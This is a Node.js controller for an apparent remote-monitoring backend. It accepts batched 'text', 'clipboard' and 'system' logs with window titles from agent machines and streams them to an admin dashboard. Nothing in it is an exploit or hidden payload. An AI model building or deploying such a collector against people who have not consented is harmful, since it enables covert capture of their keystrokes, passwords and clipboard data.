// src/controllers/logController.js
// Handles all Log-related REST endpoints.
// The batch endpoint is the critical REST fallback for WebSocket failures.

const prisma = require('../utils/prisma');
const logger = require('../utils/logger');

// Max logs accepted in a single batch request (prevents DoS via huge payloads)
const MAX_BATCH_SIZE = 500;

/**
 * POST /api/logs/batch
 * Agent REST fallback: bulk-insert buffered logs when WS was unavailable.
 * Requires: X-Agent-API-Key header (handled by agentAuth middleware).
 * Body: { logs: [{ timestamp?, window_title?, log_type, content, metadata? }] }
 *
 * Also broadcasts each log to /admin namespace for real-time dashboard updates.
 */
const batchIngestLogs = (io) => async (req, res, next) => {
  try {
    const { logs } = req.body;
    const agent = req.agent; // Injected by agentAuth middleware

    if (!Array.isArray(logs) || logs.length === 0) {
      return res.status(400).json({
        error: 'Bad Request',
        message: '`logs` must be a non-empty array.',
      });
    }

    if (logs.length > MAX_BATCH_SIZE) {
      return res.status(413).json({
        error: 'Payload Too Large',
        message: `Maximum batch size is ${MAX_BATCH_SIZE} logs.`,
      });
    }

    // Validate each log entry
    const VALID_TYPES = ['text', 'clipboard', 'system'];
    const invalid = logs.find((l) => !l.content || !VALID_TYPES.includes(l.log_type));
    if (invalid) {
      return res.status(400).json({
        error: 'Bad Request',
        message: `Each log requires 'content' and a valid 'log_type' (${VALID_TYPES.join(', ')}).`,
      });
    }

    // Bulk insert — createMany is far more efficient than N individual creates
    const payload = logs.map((log) => ({
      agent_id: agent.id,
      timestamp: log.timestamp ? new Date(log.timestamp) : new Date(),
      window_title: log.window_title || null,
      log_type: log.log_type,
      content: log.content,
      metadata: log.metadata || undefined,
    }));

    await prisma.log.createMany({ data: payload });

    // Update agent heartbeat
    await prisma.agent.update({
      where: { id: agent.id },
      data: { status: 'online', last_seen: new Date() },
    });

    // Broadcast batch to all connected admin sockets
    if (io) {
      const adminNs = io.of('/admin');
      payload.forEach((log) => {
        adminNs.emit('new_log', {
          ...log,
          agent_hostname: agent.hostname,
          agent_id: agent.id,
        });
      });
    }

    logger.info('Batch logs ingested', { agentId: agent.id, count: logs.length });

    return res.status(202).json({
      message: `${logs.length} log(s) accepted.`,
      agent_id: agent.id,
    });
  } catch (err) {
    next(err);
  }
};

/**
 * GET /api/logs
 * Admin-only: Paginated log retrieval with optional filters.
 * Query params: agentId, log_type, limit (default 100), cursor (for cursor pagination)
 */
const getLogs = async (req, res, next) => {
  try {
    const { agentId, log_type, limit = '100', cursor } = req.query;
    const take = Math.min(parseInt(limit, 10) || 100, 1000);

    const where = {
      ...(agentId && { agent_id: agentId }),
      ...(log_type && { log_type }),
    };

    const logs = await prisma.log.findMany({
      where,
      take,
      ...(cursor && { skip: 1, cursor: { id: cursor } }),
      orderBy: { timestamp: 'desc' },
      select: {
        id: true,
        agent_id: true,
        timestamp: true,
        window_title: true,
        log_type: true,
        content: true,
        metadata: true,
        agent: { select: { hostname: true } },
      },
    });

    const nextCursor = logs.length === take ? logs[logs.length - 1].id : null;

    return res.json({
      logs,
      pagination: {
        limit: take,
        next_cursor: nextCursor,
        has_more: nextCursor !== null,
      },
    });
  } catch (err) {
    next(err);
  }
};

/**
 * DELETE /api/logs/:agentId
 * Admin-only: Purge all logs for a specific agent.
 */
const purgeAgentLogs = async (req, res, next) => {
  try {
    const { agentId } = req.params;
    const { count } = await prisma.log.deleteMany({ where: { agent_id: agentId } });
    logger.info('Agent logs purged', { agentId, count });
    return res.json({ message: `${count} log(s) deleted for agent ${agentId}.` });
  } catch (err) {
    next(err);
  }
};

module.exports = { batchIngestLogs, getLogs, purgeAgentLogs };
